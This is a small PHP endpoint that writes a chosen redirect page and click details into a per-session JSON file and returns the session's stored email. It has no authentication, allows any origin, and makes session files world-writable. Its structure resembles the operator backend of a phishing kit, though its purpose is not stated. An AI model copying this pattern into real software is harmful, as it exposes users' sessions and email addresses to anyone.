<?php
require_once __DIR__ . '/config.php';

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$page = $_POST['page'] ?? $_GET['page'] ?? '';
$sessionId = $_POST['session_id'] ?? $_GET['session_id'] ?? '';
$source = $_POST['source'] ?? 'direct_button';

if (empty($sessionId) || empty($page)) {
    echo json_encode(['success' => false, 'error' => 'Missing params']);
    exit;
}

$sessionId = preg_replace('/[^a-zA-Z0-9_-]/', '', $sessionId);
$page = preg_replace('/[^a-zA-Z0-9_]/', '', $page);

$sessionFile = SESSION_DIR . '/session_' . $sessionId . '.json';

// Read current
$data = [];
if (file_exists($sessionFile)) {
    $content = @file_get_contents($sessionFile);
    if ($content) {
        $data = json_decode($content, true);
        if (!is_array($data)) $data = [];
    }
}

// Update
$data['redirect'] = $page;
$data['button_click_time'] = date('Y-m-d H:i:s');
$data['button_clicked_from'] = $source;

// Write with retries
$success = false;
for ($attempt = 0; $attempt < 5; $attempt++) {
    $json = json_encode($data);
    $result = @file_put_contents($sessionFile, $json, LOCK_EX);
    if ($result !== false) {
        @chmod($sessionFile, 0666);
        $success = true;
        break;
    }
    usleep(50000);
}

// Verify
usleep(100000);
if (file_exists($sessionFile)) {
    $verify = json_decode(file_get_contents($sessionFile), true);
    $verified = isset($verify['redirect']) && $verify['redirect'] === $page;
} else {
    $verified = false;
}

echo json_encode([
    'success' => $success && $verified,
    'page' => $page,
    'session_id' => $sessionId,
    'email' => $data['email'] ?? 'unknown',
    'verified' => $verified,
    'timestamp' => date('Y-m-d H:i:s')
]);
?>
